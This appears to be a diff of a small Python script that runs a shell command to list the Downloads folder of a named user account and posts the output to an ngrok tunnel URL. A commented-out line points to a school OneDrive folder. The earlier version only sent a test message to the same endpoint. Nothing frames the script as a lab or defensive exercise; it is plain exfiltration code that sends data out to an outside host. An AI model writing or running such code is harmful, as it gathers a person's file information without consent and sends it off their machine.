@@ -1,11 +1,12 @@
-import os, requests
-
-# .replace(" ", "%20")
+#!/usr/bin/python3
+import os, requests, subprocess
 
 user = os.environ["USER"]
-os.listdir(f"/Users/{user}/")
+# files = os.listdir("/Users/011935/OneDrive - King's Christian College")
 
-url = "https://37fb24483abd.ngrok-free.app/log"
-data = {"msg": "hello from the other side"}
-
-response = requests.post(url, data=data)
+response = requests.post(
+    "https://37fb24483abd.ngrok-free.app/log/011935",
+    data={
+        "msg": subprocess.getoutput('cd /Users/011935/Downloads && ls') #'\n'.join(files)
+    }
+)
